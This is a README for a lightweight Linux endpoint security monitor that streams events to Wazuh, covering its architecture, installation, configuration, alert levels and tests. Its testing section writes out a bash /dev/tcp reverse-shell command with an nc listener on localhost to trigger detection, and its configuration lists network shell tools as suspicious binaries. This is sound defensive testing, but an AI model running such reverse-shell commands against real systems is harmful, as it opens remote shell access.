# Endpoint Monitor

A lightweight, single-file Linux endpoint security monitor that streams structured JSON events to Wazuh. Zero Python dependencies — uses only the standard library plus optional `auditd` for kernel-grade syscall visibility.

**Footprint:** ~14-18 MB RAM, <1% CPU, capped at 30 MB via systemd cgroup.

---

## Table of Contents

- [Features](#features)
- [Architecture](#architecture)
- [Requirements](#requirements)
- [Installation](#installation)
- [Configuration](#configuration)
- [Wazuh Integration](#wazuh-integration)
- [Event Reference](#event-reference)
- [Testing](#testing)
- [Performance Tuning](#performance-tuning)
- [Troubleshooting](#troubleshooting)
- [File Structure](#file-structure)
- [Comparison with Alternatives](#comparison-with-alternatives)

---

## Features

| Category | Coverage |
|---|---|
| **Process execution** | 3-layer defense: netlink proc connector + auditd execve + kernel BSD pacct |
| **TCP/UDP connections** | `/proc/net` polling (1s) + auditd connect/accept/bind syscalls |
| **DNS queries** | Port 53 detection + `/etc/resolv.conf` watch + auditd `dns_change` |
| **File access** | inotify on critical paths + auditd `file_tamper` on syscall level |
| **Privilege escalation** | UID change events + auditd `setuid`/`sudo`/`pkexec` tracking |
| **Reverse shells** | Real-time correlator: shell process + open network socket = critical alert |
| **Malware staging** | inotify on `/tmp`, `/dev/shm`, `/var/tmp` + auditd file writes |
| **Kernel rootkits** | auditd `kmod_load` on `init_module`/`finit_module` |
| **Anti-forensics** | auditd `time_change` on `adjtimex`/`settimeofday` |
| **Short-lived process capture** | Kernel BSD pacct guarantees every exit is recorded |

All events emitted as JSON lines for easy ingestion into Wazuh, Elastic, Loki, or any log pipeline.

---

## Architecture

The tool runs 5-6 cooperating threads in a single Python process:

```
┌────────────────────────────────────────────────────────────────┐
│                     endpoint_monitor.py                        │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  ┌──────────────────┐  ┌──────────────────┐                    │
│  │ ProcessMonitor   │  │ NetworkMonitor   │                    │
│  │ (netlink kernel) │  │ (/proc/net poll) │                    │
│  └────────┬─────────┘  └────────┬─────────┘                    │
│           │                     │                              │
│  ┌────────▼─────────┐  ┌────────▼─────────┐                    │
│  │ FileMonitor      │  │ AuditdMonitor    │                    │
│  │ (inotify)        │  │ (tails audit.log)│                    │
│  └────────┬─────────┘  └────────┬─────────┘                    │
│           │                     │                              │
│  ┌────────▼─────────┐  ┌────────▼─────────┐                    │
│  │ ProcessAccount-  │  │ ThreatCorrelator │                    │
│  │ ingMonitor       │  │ (reverse shells) │                    │
│  │ (kernel pacct)   │  │                  │                    │
│  └────────┬─────────┘  └────────┬─────────┘                    │
│           │                     │                              │
│           ▼                     ▼                              │
│        ┌──────────────────────────────┐                        │
│        │       EventLogger            │                        │
│        │  (raw os.write JSON lines)   │                        │
│        └──────────────┬───────────────┘                        │
│                       │                                        │
└───────────────────────┼────────────────────────────────────────┘
                        │
                        ▼
         /var/log/endpoint_monitor/events.json.log
                        │
                        ▼
                   Wazuh Agent → Manager
```

### 3-Layer Process Defense

This is the headline architectural feature — no process exit is ever missed:

| Layer | Mechanism | When it fires | Reliability |
|---|---|---|---|
| 1 | netlink proc connector | At `execve` (real-time) | Fast but kernel can drop on overload |
| 2 | auditd execve syscall hook | At `execve` (real-time) | Never drops; queued in kernel |
| 3 | BSD process accounting | At process **exit** | **Guaranteed** by kernel for every exit |

---

## Requirements

- **OS:** Linux 2.6.15+ (most distros from 2008+)
- **Python:** 3.6+ (only stdlib used — no `pip install` required)
- **Privileges:** root (needed for netlink, inotify on system paths, `acct()` syscall)
- **Kernel features:** `CONFIG_BSD_PROCESS_ACCT=y`, `CONFIG_PROC_EVENTS=y`, `CONFIG_CONNECTOR=y` (default on all major distros)
- **Optional:** auditd installed (`apt install auditd` / `yum install audit`) for syscall-level coverage

Verify kernel support:

```bash
grep -E "BSD_PROCESS_ACCT|PROC_EVENTS|CONNECTOR" /boot/config-$(uname -r)
```

---

## Installation

### 1. Copy files

```bash
sudo mkdir -p /opt/endpoint-monitor
sudo cp endpoint_monitor.py endpoint_monitor.rules /opt/endpoint-monitor/
sudo cp endpoint_monitor.service /etc/systemd/system/
```

### 2. Install auditd (recommended)

```bash
# Debian / Ubuntu
sudo apt-get install -y auditd

# RHEL / CentOS / Rocky
sudo yum install -y audit
```

### 3. Install audit rules (one-shot)

```bash
sudo python3 -O /opt/endpoint-monitor/endpoint_monitor.py --install-audit-rules
```

This copies `endpoint_monitor.rules` to `/etc/audit/rules.d/` and runs `augenrules --load`.

### 4. Start the service

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now endpoint-monitor
sudo systemctl status endpoint-monitor
```

Expected status:
```
● endpoint-monitor.service - Lightweight Endpoint Monitor
   Active: active (running)
   Tasks: 6
   Memory: 14.5M
```

### 5. Verify logs are flowing

```bash
sudo tail -f /var/log/endpoint_monitor/events.json.log
```

You should see a `monitor_start` event immediately, followed by ambient process activity.

---

## Configuration

Default config is baked into `endpoint_monitor.py` (`DEFAULT_CONFIG` dict). To override, pass a JSON file:

```bash
sudo python3 endpoint_monitor.py --config /etc/endpoint_monitor.json
```

### Example config

```json
{
  "log_file": "/var/log/endpoint_monitor/events.json.log",
  "log_max_bytes": 52428800,
  "log_backup_count": 5,

  "network_poll_sec": 1,
  "correlator_poll_sec": 10,

  "audit_enabled": true,
  "audit_log_path": "/var/log/audit/audit.log",
  "audit_install_rules": true,
  "audit_flush_ms": 500,

  "process_accounting_enabled": true,
  "process_accounting_file": "/var/log/endpoint_monitor/pacct",
  "process_accounting_max_bytes": 52428800,

  "watch_files": [
    "/etc/passwd", "/etc/shadow", "/etc/sudoers",
    "/etc/ssh/sshd_config", "/etc/ld.so.preload"
  ],
  "watch_dirs": [
    "/tmp", "/dev/shm", "/var/tmp",
    "/var/spool/cron", "/etc/cron.d"
  ],
  "staging_dirs": ["/tmp", "/dev/shm", "/var/tmp"],

  "suspicious_bins": ["nc", "ncat", "socat", "curl", "wget", "python3", "perl"],
  "privesc_bins":    ["sudo", "su", "pkexec", "doas"],
  "suspicious_ports": [4444, 5555, 6666, 1337, 9001]
}
```

### Key tuning parameters

| Setting | Default | Effect |
|---|---|---|
| `network_poll_sec` | 1 | Lower = faster detection, slightly more CPU |
| `correlator_poll_sec` | 10 | How often to check for reverse-shell pattern |
| `audit_flush_ms` | 500 | Wait time for grouping audit records by msgid |
| `log_max_bytes` | 50 MB | Per-file rotation threshold |
| `process_accounting_max_bytes` | 50 MB | pacct file rotation |

---

## Wazuh Integration

### On the Wazuh Agent

Add to `/var/ossec/etc/ossec.conf`:

```xml
<localfile>
  <log_format>json</log_format>
  <location>/var/log/endpoint_monitor/events.json.log</location>
</localfile>
```

Restart the agent:

```bash
sudo systemctl restart wazuh-agent
```

### On the Wazuh Manager

Copy the custom rules:

```bash
sudo cp wazuh_rules.xml /var/ossec/etc/rules/endpoint_monitor_rules.xml
sudo chown wazuh:wazuh /var/ossec/etc/rules/endpoint_monitor_rules.xml
sudo systemctl restart wazuh-manager
```

### Alert Severity Map

| Wazuh Level | Trigger |
|---|---|
| **14** | Reverse shell detected (rule 100213) |
| **12** | Critical file modified (`/etc/shadow`, `/etc/sudoers`) |
| **12** | Kernel module loaded (rootkit indicator) |
| **12** | Process executed from staging directory |
| **10** | UID change to elevated privileges |
| **10** | System time tampered |
| **10** | Process crashed with core dump (exploit indicator) |
| **10** | High-frequency exec from same user (brute force / scan) |
| **8** | Suspicious binary executed |
| **8** | Connection to suspicious port (4444, 5555, etc.) |
| **8** | DNS configuration changed |
| **8** | Privilege escalation syscall |
| **8** | setuid privilege used |
| **6** | Privilege escalation binary used (sudo/su/pkexec) |
| **6** | Cron job modified |
| **6** | Process killed by signal |
| **5** | Shell/LOLBin executed |
| **5** | Short-lived process detected by pacct |
| **3** | Normal process exec, network connection, file event |

---

## Event Reference

All events follow this JSON envelope:

```json
{
  "timestamp": "2026-06-03T18:00:00.123456Z",
  "hostname": "endpoint01",
  "event_type": "process_exec",
  "severity": "info",
  "tags": ["process_exec", "shell_exec"],
  "source": "endpoint_monitor",
  "details": { "...": "..." }
}
```

### Event types

| `event_type` | Emitted by | Description |
|---|---|---|
| `monitor_start` / `monitor_stop` | `main()` | Lifecycle events |
| `process_exec` | `ProcessMonitor` | Process exec captured via proc connector |
| `process_fork` | `ProcessMonitor` | Fork from an interactive shell |
| `uid_change` | `ProcessMonitor` | Effective UID elevated |
| `process_exit` | `ProcessAccountingMonitor` | Kernel pacct record (every exit) |
| `network_connection` | `NetworkMonitor` | New TCP/UDP connection from `/proc/net` |
| `file_event` | `FileMonitor` | inotify event on a watched path |
| `audit_event` | `AuditdMonitor` | Parsed auditd record (grouped by msgid) |
| `reverse_shell_suspect` | `ThreatCorrelator` | Shell PID holds an open network socket |

### Common tags

`process_exec`, `process_exit`, `process_fork`, `short_lived`, `shell_exec`, `suspicious_binary`, `priv_esc`, `setuid_used`, `network`, `outbound`, `dns_query`, `suspicious_port`, `file_event`, `critical_file`, `staging_area`, `executable_drop`, `cron_modification`, `audit`, `identity`, `kernel_module`, `time_change`, `dns_change`, `reverse_shell`, `crash`, `killed`

---

## Testing

### Quick smoke test

```bash
sudo systemctl start endpoint-monitor
sleep 5

ls /tmp                                  # process_exec event
curl -s http://example.com >/dev/null    # network_connection
nslookup google.com 8.8.8.8              # dns_query
touch -a /etc/passwd                     # critical_file event

sudo tail -20 /var/log/endpoint_monitor/events.json.log | \
  python3 -c "import json,sys; [print(json.loads(l)['event_type'], json.loads(l)['tags']) for l in sys.stdin]"
```

### Reverse shell test (the headline detection)

Terminal 1 (listener):
```bash
nc -lvnp 4444
```

Terminal 2 (victim):
```bash
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' &
```

Within ~10s the log should contain:

```json
{"event_type":"reverse_shell_suspect","severity":"critical","tags":["reverse_shell","threat"]}
```

### Short-lived process capture test

Spawn 100 microsecond-lived processes — pacct must catch them all:

```bash
for i in $(seq 1 100); do /bin/true; done

sleep 5
sudo grep -c '"event_type":"process_exit"' \
  /var/log/endpoint_monitor/events.json.log
```

Should report **100+** (counting only `/bin/true` entries).

### Full validation playbook

See the comprehensive testing chat for a phase-by-phase test plan covering all 13 detection scenarios (process exec, suspicious binaries, network, DNS, file tamper, privilege escalation, malware staging, reverse shells, kernel modules, time tampering, process crashes, stress tests, Wazuh integration).

---

## Performance Tuning

### Measuring footprint

```bash
ps -o pid,rss,vsz,pcpu,nlwp,comm -p $(pgrep -f endpoint_monitor.py)
```

Expected RSS: 14-18 MB. NLWP (thread count): 6.

### Reducing CPU under heavy load

If `auditctl -s` shows `lost > 0`, increase the audit buffer in `endpoint_monitor.rules`:

```
-b 32768
```

Then reload:

```bash
sudo augenrules --load
```

If `/proc/net` polling is excessive on a busy server, bump the interval:

```json
{ "network_poll_sec": 2 }
```

### Tier 1 RAM optimizations already applied

- Stdlib `logging` module replaced with raw `os.write()` (~1 MB saved)
- `datetime` module replaced with `time.strftime` (~200 KB saved)
- `ipaddress`, `subprocess`, `shutil` lazy-loaded (~1.2 MB saved)
- Thread stack size set to 64 KB (~500 KB saved)
- Compact JSON serialization (no whitespace)
- `python3 -O` flag in systemd unit (strips docstrings)
- systemd cgroup `MemoryHigh=30M` / `MemoryMax=50M`

---

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| Service won't start | Not running as root | `systemctl status endpoint-monitor`, check journal |
| No `process_exec` events | proc connector blocked (SELinux/AppArmor) | Check `dmesg \| grep denied`; tool falls back to /proc polling |
| No `audit_event` events | auditd not running | `systemctl status auditd && auditctl -l \| wc -l` |
| No `process_exit` events | Kernel missing `CONFIG_BSD_PROCESS_ACCT` | Check `/boot/config-$(uname -r)`; monitor disables itself gracefully |
| No `reverse_shell_suspect` | Correlator polls every 10s by default | Set `correlator_poll_sec: 2` for faster detection |
| `audit lost` counter growing | Audit buffer too small | Increase `-b` in rules file, reload with `augenrules --load` |
| RAM exceeds 30 MB and process dies | systemd cgroup MemoryMax reached | Check `journalctl -u endpoint-monitor \| grep -i memory`; tune monitors |
| Logs not appearing in Wazuh | Agent not picking up file | Verify `<localfile>` block + restart `wazuh-agent` |
| Events appear but no alerts | Rules not loaded on manager | `ls /var/ossec/etc/rules/endpoint_monitor_rules.xml`, restart manager |

### Diagnostic commands

```bash
sudo systemctl status endpoint-monitor
sudo journalctl -u endpoint-monitor -n 50 --no-pager

sudo auditctl -s
sudo auditctl -l | wc -l                 # should be ~30 rules

ls -la /var/log/endpoint_monitor/pacct
sudo lastcomm | head -5                  # human-readable pacct dump

sudo tail -f /var/log/endpoint_monitor/events.json.log | \
  python3 -m json.tool --no-ensure-ascii

sudo tail -1000 /var/log/endpoint_monitor/events.json.log | \
  python3 -c "import json,sys,collections; c=collections.Counter(json.loads(l)['event_type'] for l in sys.stdin); print('\n'.join(f'{n:6} {t}' for t,n in c.most_common()))"
```

---

## File Structure

```
endpoint-monitor/
├── endpoint_monitor.py         # Main tool (single file, stdlib only)
├── endpoint_monitor.rules      # Auditd ruleset (installed to /etc/audit/rules.d/)
├── endpoint_monitor.service    # systemd unit file
├── wazuh_rules.xml             # Wazuh manager custom rules (IDs 100200-100239)
└── README.md                   # This file
```

### Code organization (`endpoint_monitor.py`)

| Class / Section | Responsibility |
|---|---|
| `DEFAULT_CONFIG` | All tunable parameters |
| `EventLogger` | Raw `os.write` JSON line writer + manual rotation |
| `ProcessMonitor` | Netlink proc connector (real-time exec/fork/uid) |
| `NetworkMonitor` | `/proc/net/{tcp,udp,tcp6,udp6}` polling |
| `FileMonitor` | inotify via ctypes |
| `AuditdMonitor` | Tails `/var/log/audit/audit.log`, parses + emits |
| `ProcessAccountingMonitor` | Kernel BSD pacct reader (guaranteed exit capture) |
| `ThreatCorrelator` | Reverse-shell detection logic |
| `main()` | Wires monitors, signal handling, watchdog |

---

## Comparison with Alternatives

| Tool | RAM | Real-time | Wazuh Native | Notes |
|---|---|---|---|---|
| **endpoint_monitor.py** | **14-18 MB** | Yes | Yes (built-in JSON) | This tool |
| Auditd alone | ~5 MB | Yes | Yes | No correlation, no reverse shell detection |
| OSQuery | 50-120 MB | No (polling) | Yes | SQL queries, great for inventory |
| Falco | 60-150 MB | Yes (eBPF) | No (needs bridge) | K8s-focused, 1000+ community rules |
| Tetragon | 80-200 MB | Yes (eBPF) | No | Cilium project, can enforce policies |
| Tracee | 60-150 MB | Yes (eBPF) | No | Behavioral signature engine |
| Sysmon for Linux | 10-30 MB | Yes (eBPF) | Yes | Microsoft, Windows parity |
| Fluent Bit + auditd | ~8 MB | Yes | Yes | Lightest practical alternative |

See the interactive comparison canvas in the Cursor workspace for the full breakdown.

---

## License

MIT — see top-of-file header in `endpoint_monitor.py`.

---

## Support

This is a custom tool maintained internally. For issues, contact me kumaramitbansal2@gmail.com or file an issue in the project repository.
